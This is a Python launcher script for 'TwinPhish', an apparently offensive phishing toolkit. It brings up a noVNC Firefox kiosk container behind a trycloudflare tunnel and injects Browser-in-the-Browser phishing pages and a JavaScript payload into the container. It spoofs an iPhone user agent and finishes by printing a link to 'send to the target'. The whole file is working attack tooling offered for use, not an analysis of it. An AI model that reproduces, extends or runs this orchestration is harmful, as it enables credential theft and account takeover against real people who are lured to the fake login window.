#!/usr/bin/env python3
import subprocess
import threading
import time
import re
import os
import sys
import argparse

CLOUDFLARED_RE = re.compile(r"https://[a-z0-9-]+\.trycloudflare\.com")
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
NOVNC_DIR = os.path.join(BASE_DIR, "novnc")
BITB_DIR = os.path.join(BASE_DIR, "bitb")

class TwinPhishParser(argparse.ArgumentParser):
    def format_help(self):
        run_help = super().format_help()
        try:
            app_help = subprocess.run(
                ["python3", "app.py", "-h"],
                cwd=NOVNC_DIR,
                capture_output=True,
                text=True
            ).stdout
        except Exception:
            app_help = "[-] Could not load app.py help. Make sure novnc/app.py exists."

        combined = (
            run_help + 
            "\n" + "="*70 + "\n" +
            " APP.PY OPTIONS (Forwarded directly to the backend container) \n" +
            "="*70 + "\n" +
            app_help
        )
        return combined

def docker_cp(src, dst):
    try:
        subprocess.run(["docker", "cp", src, dst], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except (subprocess.CalledProcessError, FileNotFoundError):
        subprocess.run(["sudo", "docker", "cp", src, dst], check=True)

def inject_mobile_user_agent():
    user_js_path = "/docker/appdata/firefox/user.js"
    mobile_ua = 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.0 Mobile/15E148 Safari/604.1'
    os.makedirs(os.path.dirname(user_js_path), exist_ok=True)
    with open(user_js_path, "a") as f:
        f.write(f'\nuser_pref("general.useragent.override", "{mobile_ua}");\n')

def main():
    parser = TwinPhishParser(
        description="TwinPhish Orchestrator. Use --bitb for dual-vector attack, otherwise it proxies to app.py.",
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="Examples:\n"
               "  run.py desktop -l google -tun          (Standard noVNC only)\n"
               "  run.py --bitb -l google                (BitB + noVNC, auto-mobile)\n"
    )
    parser.add_argument("--bitb", action="store_true", help="Enable Browser-in-the-Browser (BitB) module")
    args, unknown = parser.parse_known_args()

    if not args.bitb:
        os.chdir(NOVNC_DIR)
        cmd_str = f"python3 app.py {' '.join(unknown)}"
        print(f"[*] Executing: {cmd_str}\n")
        os.system(cmd_str)
        sys.exit(0)

    print("[*] Starting TwinPhish in BitB Mode...")
    app_args = ["mobile"]
    if "-tun" not in unknown and "--tunnel" not in unknown:
        app_args.append("-tun")
    
    for arg in unknown:
        if arg not in ["desktop", "core"]:
            app_args.append(arg)

    inject_mobile_user_agent()

    print(f"[*] Starting backend: python3 app.py {' '.join(app_args)}\n")
    proc = subprocess.Popen(
        ["python3", "app.py"] + app_args,
        cwd=NOVNC_DIR,
        stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True, bufsize=1
    )

    url = None
    start_time = time.time()

    while time.time() - start_time < 30:
        line = proc.stdout.readline()
        if not line: break
        sys.stdout.write(line)
        sys.stdout.flush()
        match = CLOUDFLARED_RE.search(line)
        if match:
            url = match.group(0)
            break

    def keep_reading():
        for line in proc.stdout: pass
    threading.Thread(target=keep_reading, daemon=True).start()

    if not url:
        print("[-] Failed to get tunnel URL")
        proc.terminate()
        sys.exit(1)

    print(f"\n[+] Backend Tunnel: {url}")
    print("[*] Waiting 3 seconds for noVNC to boot...")
    time.sleep(3)

    print("[*] Injecting BitB files into the container...")
    try:
        with open(os.path.join(BITB_DIR, "attacker_index.html"), "r") as f:
            html = f.read()
        
        patched_html = html.replace("__NOVNC_URL__", "")

        temp_html = os.path.join(BASE_DIR, "temp_bitb.html")
        with open(temp_html, "w") as f:
            f.write(patched_html)

        docker_cp(temp_html, "firefox-kiosk:/opt/noVNC/bitb.html")
        docker_cp(os.path.join(BITB_DIR, "bitb_payload.js"), "firefox-kiosk:/opt/noVNC/bitb_payload.js")
        docker_cp(os.path.join(BITB_DIR, "bitb_payload.css"), "firefox-kiosk:/opt/noVNC/bitb_payload.css")
        
        os.remove(temp_html)
        print("[+] BitB files successfully injected!")
    except Exception as e:
        print(f"[-] Failed to inject BitB files: {e}")
        proc.terminate()
        sys.exit(1)

    print("\n" + "="*60)
    print(f" TWINPHISH READY! Send this link to the target:")
    print(f" {url}/bitb.html")
    print("="*60 + "\n")

    try:
        while True: time.sleep(1)
    except KeyboardInterrupt:
        print("\n[*] Shutting down...")
        proc.terminate()
        subprocess.run(["python3", "app.py", "stop", "-y"], cwd=NOVNC_DIR, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        ua_file = "/docker/appdata/firefox/user.js"
        if os.path.exists(ua_file): os.remove(ua_file)
        sys.exit(0)

if __name__ == "__main__":
    main()